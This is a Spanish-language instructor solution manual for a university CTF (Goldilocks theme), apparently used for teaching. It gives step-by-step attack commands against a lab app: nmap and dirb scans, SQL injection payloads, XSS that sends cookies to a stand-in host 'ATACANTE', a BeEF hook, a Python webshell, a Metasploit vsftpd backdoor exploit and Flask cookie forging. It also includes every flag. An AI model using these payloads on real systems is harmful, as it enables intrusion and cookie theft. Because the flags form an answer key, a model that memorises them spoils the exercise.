# Goldilocks CTF — Manual de Solución

Guía paso a paso de las 12 banderas · 3 fases · 900 puntos
Universidad de Cundinamarca · Seguridad en la Nube

> ⚠ Documento para el docente / para revisión. No entregar a los participantes
> antes de la actividad.

---

## Índice

- [Preparación](#preparación)
- [Reglas del juego](#reglas-del-juego)
- [Fase 1 — El Bosque (Reconocimiento)](#fase-1--el-bosque-reconocimiento)
  1. [La Sopa de Osito — Nmap](#1-la-sopa-de-osito--nmap)
  2. [La Sopa de Mamá Osa — Google Dorks](#2-la-sopa-de-mamá-osa--google-dorks)
  3. [La Sopa de Papá Oso — Dirb](#3-la-sopa-de-papá-oso--dirb)
  4. [El Camino al Bosque — Wireshark](#4-el-camino-al-bosque--wireshark)
- [Fase 2 — La Casa (Explotación Web)](#fase-2--la-casa-explotación-web)
  5. [La Cama de Osito — SQLi bypass de login](#5-la-cama-de-osito--sqli-bypass-de-login)
  6. [La Cama de Mamá Osa — SQLi Medium + Burp](#6-la-cama-de-mamá-osa--sqli-medium--burp)
  7. [La Cama de Papá Oso — XSS Reflejado](#7-la-cama-de-papá-oso--xss-reflejado)
  8. [La Silla Rota — XSS Almacenado + BeEF](#8-la-silla-rota--xss-almacenado--beef)
- [Fase 3 — Las Habitaciones (Escalada)](#fase-3--las-habitaciones-escalada)
  9. [Papá Oso Despierta — Webshell / RCE](#9-papá-oso-despierta--webshell--rce)
  10. [Mamá Osa Despierta — Metasploit](#10-mamá-osa-despierta--metasploit)
  11. [Osito Despierta — PrivEsc a root](#11-osito-despierta--privesc-a-root)
  12. [¡Ricitos de Oro Escapa! — Esteganografía](#12-ricitos-de-oro-escapa--esteganografía)
- [Tabla resumen de banderas](#tabla-resumen-de-banderas)

---

## Preparación

```bash
cd goldilocks_ctf
pip install -r requirements.txt
python setup_db.py         # crea BD, documento expuesto, imagen stego
python app.py              # http://localhost:5000
```

- Si vas a usar `steghide` (Fase 3.12 completa): instálalo **antes** y vuelve a
  ejecutar `python setup_db.py`.
- `setup_db.py` falla si `app.py` está corriendo (Windows bloquea `goldilocks.db`).
  Cierra la app primero.

En la mayoría de la guía se usa `http://localhost:5000`. En el laboratorio con
máquinas virtuales, sustituye por la IP del host (p. ej. `192.168.56.12:5000`).

### Usuarios de la base de datos

| Usuario   | Contraseña       | Rol   |
|-----------|------------------|-------|
| ricitos   | rizos123         | guest |
| mama_osa  | avena_caliente   | guest |
| osito     | miel             | guest |
| admin     | OsoPapa2026!     | admin |

---

## Reglas del juego

- Se entra **como invitado** desde la portada; el cronómetro arranca en **120:00**.
- Cada **pista** desbloqueada resta **5 minutos** y **25 puntos**.
- El **medidor de detección** sube con el tiempo transcurrido y **+8 %** por cada
  bandera incorrecta enviada.
- Si el cronómetro llega a `00:00` **o** la detección llega al 100 %, aparece la
  pantalla *"¡Los tres osos están cerca!"* → botón **Reiniciar escenario**.
- Cada bandera correcta suma **75 puntos** (12 × 75 = 900).
- Menú **☰** (arriba): cambiar nivel `low / medium / high`, ir al marcador,
  reiniciar, salir. El nivel afecta a los retos **6** y **9**.

---

# Fase 1 — El Bosque (Reconocimiento)

Color **verde**. Objetivo: mapear la red y encontrar información expuesta antes de
tocar la aplicación.

---

## 1. La Sopa de Osito — Nmap

**Bandera:** `CTF{osito_bosque_nmap_hosts_activos}`
**Página:** `/challenges/nmap`

### Idea
Identificar los hosts vivos de la red y, sobre el correcto, descubrir un servicio
en un puerto **no estándar** cuya bandera aparece en el **banner**.

### Laboratorio real (Kali)
```bash
# 1) ¿Qué hosts están activos?
nmap -sn 192.168.56.0/24

# 2) Escaneo de servicios/versión sobre el host de la app
nmap -sS -sV -p- 192.168.56.12
```

Salida relevante:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1
80/tcp   open  http    nginx 1.18.0
1337/tcp open  soup    Osito-Soup-Daemon 1.0 (banner: CTF{osito_bosque_nmap_hosts_activos})
```

Para leer el banner directamente:
```bash
nc 192.168.56.12 1337
# o
nmap -sV --script=banner -p 1337 192.168.56.12
```

### En la plataforma
La página **"Consola de reconocimiento (simulada)"** ya muestra esa misma salida:
la bandera está en el banner del puerto `1337`. Cópiala y envíala.

---

## 2. La Sopa de Mamá Osa — Google Dorks

**Bandera:** `CTF{mama_bosque_dork_archivo_expuesto}`
**Página:** `/challenges/dork`

### Idea
Un archivo interno quedó accesible sin enlace. Se localiza con operadores de
búsqueda (`site:`, `filetype:`) o revisando `robots.txt`.

### Pasos
```bash
# 1) robots.txt lista las carpetas que "no deberían" verse
curl http://localhost:5000/robots.txt
```
```
User-agent: *
Disallow: /admin
Disallow: /flags
Disallow: /uploads
Disallow: /static/docs/
Disallow: /despensa_secreta
# Nota interna: /static/docs/informe_seguridad_osos.txt NO debe indexarse
```
```bash
# 2) Abrir el archivo expuesto
curl http://localhost:5000/static/docs/informe_seguridad_osos.txt
```
```
INFORME INTERNO DE SEGURIDAD — CASA DE LOS TRES OSOS
...
Token de auditoría: CTF{mama_bosque_dork_archivo_expuesto}
```

### Dork equivalente (entorno con buscador)
```
site:goldilocks.ctf filetype:txt
site:goldilocks.ctf inurl:docs
```

En la plataforma hay botones directos a `/robots.txt` y al documento.

---

## 3. La Sopa de Papá Oso — Dirb

**Bandera:** `CTF{papa_bosque_dirb_ruta_oculta}`
**Página:** `/challenges/dirb`

### Idea
Existe una ruta que **no está enlazada en ninguna página**. Se descubre por
fuerza bruta de directorios.

### Pasos
```bash
dirb http://localhost:5000/ /usr/share/wordlists/dirb/common.txt
# o
gobuster dir -u http://localhost:5000/ -w /usr/share/wordlists/dirb/common.txt
```
Resultado:
```
+ http://localhost:5000/despensa_secreta   (CODE:200)
```
```bash
curl http://localhost:5000/despensa_secreta
```
```
── DESPENSA SECRETA DE PAPÁ OSO ──
Inventario: 3 tarros de miel, 1 saco de avena, frambuesas.
Post-it olvidado en el estante: CTF{papa_bosque_dirb_ruta_oculta}
```

> `robots.txt` también menciona `/despensa_secreta` — sirve de atajo/pista.

---

## 4. El Camino al Bosque — Wireshark

**Bandera:** `CTF{ricitos_bosque_wireshark_credenciales}`
**Página:** `/challenges/wireshark`

### Idea
Se capturó tráfico HTTP con credenciales en **texto claro**. Hay que extraer y
decodificar la cabecera `Authorization: Basic`.

### Pasos
```bash
# 1) Descargar la captura
curl -OJ http://localhost:5000/challenges/wireshark/captura.pcap
#   -> captura_bosque.pcap
```

Contenido (equivale al *Follow → TCP Stream* de Wireshark):
```
POST /login HTTP/1.1
Host: goldilocks.ctf
Authorization: Basic cmljaXRvczpDVEZ7cmljaXRvc19ib3NxdWVfd2lyZXNoYXJrX2NyZWRlbmNpYWxlc30=
...
```
```bash
# 2) Decodificar el Base64
echo 'cmljaXRvczpDVEZ7cmljaXRvc19ib3NxdWVfd2lyZXNoYXJrX2NyZWRlbmNpYWxlc30=' | base64 -d
# ricitos:CTF{ricitos_bosque_wireshark_credenciales}
```

La bandera es la parte después de los dos puntos (`usuario:contraseña`).

### En Wireshark (pcap real)
1. Filtro: `http.request.method == "POST"` o `http.authorization`.
2. Clic derecho en el paquete → **Follow → HTTP/TCP Stream**.
3. Copiar el valor tras `Authorization: Basic ` y decodificarlo.

---

# Fase 2 — La Casa (Explotación Web)

Color **dorado**. Objetivo: explotar la aplicación (SQLi, XSS). Los 4 retos son
**interactivos**: se explotan en la propia página.

> Nivel de dificultad en el menú ☰: `low` (por defecto) y `high` sólo afectan al
> reto **6**; el resto se resuelven igual en cualquier nivel. En `high` el código
> es seguro y sirve para comparar.

---

## 5. La Cama de Osito — SQLi bypass de login

**Bandera:** `CTF{osito_casa_sqli_bypass_login}`
**Página:** `/challenges/sqli-login`

### Idea
El formulario concatena la entrada directamente en la consulta:
```python
query = f"SELECT username, role FROM users WHERE username = '{u}' AND password = '{p}'"
```
Se puede cerrar la comilla y comentar el resto para entrar sin contraseña.

### Payload
| Campo      | Valor                |
|------------|----------------------|
| Usuario    | `admin'--`           |
| Contraseña | *(cualquier cosa)*   |

Otras variantes válidas:
```
' OR '1'='1'#
' OR 1=1 LIMIT 1--
admin' /*
```

La consulta resultante:
```sql
SELECT username, role FROM users WHERE username = 'admin'--' AND password = 'x'
```

### Resultado
La página detecta que la contraseña real no coincide → *"Autenticación saltada"*
y muestra:
```
CTF{osito_casa_sqli_bypass_login}
```

---

## 6. La Cama de Mamá Osa — SQLi Medium + Burp

**Bandera:** `CTF{mama_casa_sqli_burp_medium}`
**Página:** `/challenges/sqli-medium`

### Idea
El buscador de recetas **elimina la comilla simple** pero usa comillas dobles en
la consulta:
```python
safe = raw.replace("'", "")            # sólo filtra '
sql  = f'SELECT name, description FROM recipes WHERE ingredient = "{safe}"'
```
Se evade con comilla **doble** y `UNION` para leer la columna `secret`.

### Payload
```
" UNION SELECT name, secret FROM recipes--
```
> La consulta base devuelve 2 columnas (`name`, `description`), por eso el `UNION`
> también lleva 2. La fila `REGISTRO_CONFIDENCIAL` tiene la bandera en `secret`.

Prueba previa para confirmar la inyección:
```
" OR 1=1--
```
(devuelve todas las recetas).

### Con Burp Suite
1. Configurar el navegador con el proxy de Burp (`127.0.0.1:8080`).
2. **Proxy → Intercept ON**, enviar la búsqueda.
3. En la petición interceptada, modificar el parámetro `ingredient`:
   ```
   ingredient=" UNION SELECT name, secret FROM recipes--
   ```
   (URL-encode si hace falta: `%22%20UNION%20SELECT%20name,%20secret%20FROM%20recipes--`)
4. **Forward**. La respuesta trae la fila con la bandera.

Resultado en la tabla:
```
REGISTRO_CONFIDENCIAL | CTF{mama_casa_sqli_burp_medium}
```

---

## 7. La Cama de Papá Oso — XSS Reflejado

**Bandera:** `CTF{papa_casa_xss_reflected_cookie}`
**Página:** `/challenges/xss-reflected`

### Idea
El parámetro `nombre` se refleja en el HTML **sin escapar**. El servidor deja una
cookie `bear_session` que es **Base64 de la bandera**. El objetivo del ataque XSS
es robar esa cookie.

### Pasos
```
http://localhost:5000/challenges/xss-reflected?nombre=<script>alert(document.cookie)</script>
```
El `alert` muestra: `bear_session=Q1RGe3BhcGFfY2FzYV94c3NfcmVmbGVjdGVkX2Nvb2tpZX0=`

Decodificar:
```bash
echo 'Q1RGe3BhcGFfY2FzYV94c3NfcmVmbGVjdGVkX2Nvb2tpZX0=' | base64 -d
# CTF{papa_casa_xss_reflected_cookie}
```

O directamente en la consola del navegador (F12):
```js
atob(document.cookie.split('bear_session=')[1].split(';')[0])
```

### Exfiltración "real" (demostración del robo)
```
?nombre=<script>new Image().src='http://ATACANTE:8000/c?'+btoa(document.cookie)</script>
```
Con `python3 -m http.server 8000` en la máquina atacante se ve la cookie en los
logs; se decodifica dos veces (la del parámetro y la del valor de cookie).

---

## 8. La Silla Rota — XSS Almacenado + BeEF

**Bandera:** `CTF{ricitos_casa_xss_stored_beef_hook}`
**Página:** `/challenges/xss-stored`

### Idea
El **muro de recados** guarda y renderiza los comentarios **sin sanear**. Un
comentario con `<script>` queda persistente. Cuando el "oso administrador" (bot)
revisa el muro, su navegador ejecuta el script y queda **enganchado a BeEF**.

### Pasos
1. Arrancar BeEF (laboratorio): `beef-xss` → anota la URL del hook
   (`http://TU_IP:3000/hook.js`).
2. Publicar un recado con el payload persistente:
   ```html
   <script src="http://TU_IP:3000/hook.js"></script>
   ```
3. Pulsar **"🐻 Simular visita del oso admin"**.
4. La página confirma el enganche y muestra:
   ```
   CTF{ricitos_casa_xss_stored_beef_hook}
   ```
   (En BeEF real: el navegador del bot aparece "Online Browsers" → módulo
   *Get Cookie* / *Get Visited URLs*.)

> Si el recado no contiene una etiqueta `<script`, el bot no se engancha y la
> página lo dice.

---

# Fase 3 — Las Habitaciones (Escalada)

Color **rojo**. Objetivo: pasar de acceso web a ejecución de comandos y a root.
Los osos empiezan a despertar (la detección sube más rápido — no te demores).

---

## 9. Papá Oso Despierta — Webshell / RCE

**Bandera:** `CTF{papa_habitacion_webshell_rce}`
**Página:** `/challenges/webshell`

### Idea
La galería de fotos **no valida** el archivo subido (nivel `low`). Se sube una
webshell en Python y el servidor la ejecuta pasándole `?cmd=`.

### Pasos
```bash
# 1) Crear la webshell
cat > shell.py <<'EOF'
import subprocess
from flask import request
def run():
    return subprocess.getoutput(request.args.get('cmd', 'id'))
EOF
```
2. Subirla por el formulario de la página (**nivel low**).
3. Ejecutar comandos:
```
http://localhost:5000/uploads/shell.py?cmd=id
http://localhost:5000/uploads/shell.py?cmd=ls /flags
http://localhost:5000/uploads/shell.py?cmd=cat /flags/papa_oso.txt
```
Salida:
```
$ cat /flags/papa_oso.txt
CTF{papa_habitacion_webshell_rce}
```

### Nivel Medium / High
- **Medium** — sólo se comprueba la extensión (`.png/.jpg/.gif`). Bypass:
  `shell.jpg.py`, o interceptar con Burp y cambiar el nombre a `shell.py`
  después de que pase el filtro del navegador. (En esta plataforma el check de
  medium es por extensión final; usar `.py` disfrazado o subir en `low`.)
- **High** — se validan extensión **y** *magic bytes*. Crear un poliglota que
  empiece por `GIF89a` seguido de código, con extensión permitida — fuera de
  alcance para la puntuación; se explota en `low`.

---

## 10. Mamá Osa Despierta — Metasploit

**Bandera:** `CTF{mama_habitacion_metasploit_exploit}`
**Página:** `/challenges/metasploit`

### Idea
Contra **Metasploitable 2** (`192.168.56.13`): explotar la backdoor de
**vsftpd 2.3.4** (puerto 6200) y leer la bandera del sistema.

### Pasos
```bash
msfconsole -q
```
```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.56.13
msf6 > run

[*] Command shell session 1 opened
```
```bash
# ya con shell:
cat /home/msfadmin/mama_osa.flag
# CTF{mama_habitacion_metasploit_exploit}
```

### Alternativas contra Metasploitable 2
- `exploit/multi/samba/usermap_script` (puerto 139/445).
- `exploit/unix/irc/unreal_ircd_3281_backdoor` (puerto 6667).

Este reto es **briefing + envío**: la plataforma no hostea Metasploitable; envía
la bandera indicada tras completar el ejercicio en el laboratorio.

---

## 11. Osito Despierta — PrivEsc a root

**Bandera:** `CTF{osito_habitacion_privesc_root}`
**Página:** `/challenges/privesc`

### Idea (laboratorio Linux)
Con una shell de usuario limitado, escalar a root:
```bash
sudo -l                                   # comandos sin contraseña
find / -perm -4000 -type f 2>/dev/null     # binarios SUID
# GTFOBins para el binario encontrado (p.ej. nmap --interactive, find -exec, etc.)
cat /root/flag.txt
```

### En la plataforma (análogo)
El panel comprueba el rol mediante la **cookie de sesión**. Escalar el rol a
`admin`:

**Nivel low — cookie sin firmar bien / editable:**
1. F12 → *Application → Cookies → localhost*.
2. Cambiar `role` a `admin` (si la sesión no está firmada) y recargar.

**Nivel medium — sesión Flask firmada con clave débil:**
```bash
curl http://localhost:5000/admin/config
# SECRET_KEY = 'osito123'

pip install flask-unsign
flask-unsign --decode --cookie "<TU_COOKIE_session>"
flask-unsign --sign \
  --cookie "{'username':'ricitos','role':'admin','guest':True,'game_start':<num>,'solved':[],'hints':[],'level':'low','penalty_seconds':0,'penalty_points':0,'detection_hits':0}" \
  --secret 'osito123'
```
Pegar la cookie firmada en el navegador (F12 → Cookies → `session`) y recargar
`/challenges/privesc`.

### Resultado
```
# cat /root/flag.txt
CTF{osito_habitacion_privesc_root}
```

---

## 12. ¡Ricitos de Oro Escapa! — Esteganografía

**Bandera:** `CTF{ricitos_habitacion_steghide_final}`
**Página:** `/challenges/stego`

### Idea
La imagen del cuadro del pasillo esconde un archivo con `steghide`. Contraseña:
el nombre de la protagonista en minúsculas y sin tildes → **`ricitos`**.

### Con steghide (setup ejecutado con steghide instalado)
```bash
# Descargar la imagen desde la página
steghide extract -sf cuadro_del_pasillo.jpg
# Enter passphrase: ricitos
# wrote extracted data to "mensaje_oculto.txt".

cat mensaje_oculto.txt
# Los tres osos regresan al amanecer.
# FLAG: CTF{ricitos_habitacion_steghide_final}
```

### Sin steghide (setup lo añade al final del PNG)
```bash
strings cuadro_del_pasillo.png | grep CTF
# CTF{ricitos_habitacion_steghide_final}

# o
xxd cuadro_del_pasillo.png | tail -5
binwalk cuadro_del_pasillo.png
```

Enviar la bandera cierra la narrativa: Ricitos escapa por la ventana.

---

## Tabla resumen de banderas

| # | Fase | Desafío | Técnica | Payload / comando clave | Bandera |
|---|------|---------|---------|-------------------------|---------|
| 1 | Bosque | La Sopa de Osito | Nmap | `nmap -sS -sV -p- <ip>` → banner :1337 | `CTF{osito_bosque_nmap_hosts_activos}` |
| 2 | Bosque | La Sopa de Mamá Osa | Google Dorks | `/static/docs/informe_seguridad_osos.txt` | `CTF{mama_bosque_dork_archivo_expuesto}` |
| 3 | Bosque | La Sopa de Papá Oso | Dirb | `dirb` → `/despensa_secreta` | `CTF{papa_bosque_dirb_ruta_oculta}` |
| 4 | Bosque | El Camino al Bosque | Wireshark | `base64 -d` de `Authorization: Basic` | `CTF{ricitos_bosque_wireshark_credenciales}` |
| 5 | Casa | La Cama de Osito | SQLi login | usuario `admin'--` | `CTF{osito_casa_sqli_bypass_login}` |
| 6 | Casa | La Cama de Mamá Osa | SQLi Medium | `" UNION SELECT name, secret FROM recipes--` | `CTF{mama_casa_sqli_burp_medium}` |
| 7 | Casa | La Cama de Papá Oso | XSS reflejado | `?nombre=<script>...</script>` + `atob(cookie)` | `CTF{papa_casa_xss_reflected_cookie}` |
| 8 | Casa | La Silla Rota | XSS almacenado | recado `<script src=".../hook.js">` + bot | `CTF{ricitos_casa_xss_stored_beef_hook}` |
| 9 | Habitaciones | Papá Oso Despierta | Webshell/RCE | `shell.py` → `?cmd=cat /flags/papa_oso.txt` | `CTF{papa_habitacion_webshell_rce}` |
| 10 | Habitaciones | Mamá Osa Despierta | Metasploit | `exploit/unix/ftp/vsftpd_234_backdoor` | `CTF{mama_habitacion_metasploit_exploit}` |
| 11 | Habitaciones | Osito Despierta | PrivEsc | cookie `role=admin` / `flask-unsign` con `osito123` | `CTF{osito_habitacion_privesc_root}` |
| 12 | Habitaciones | ¡Ricitos de Oro Escapa! | Esteganografía | `steghide extract` pass `ricitos` | `CTF{ricitos_habitacion_steghide_final}` |

**Puntuación máxima:** 12 × 75 = **900 pts** (sin usar pistas y sin banderas
incorrectas).
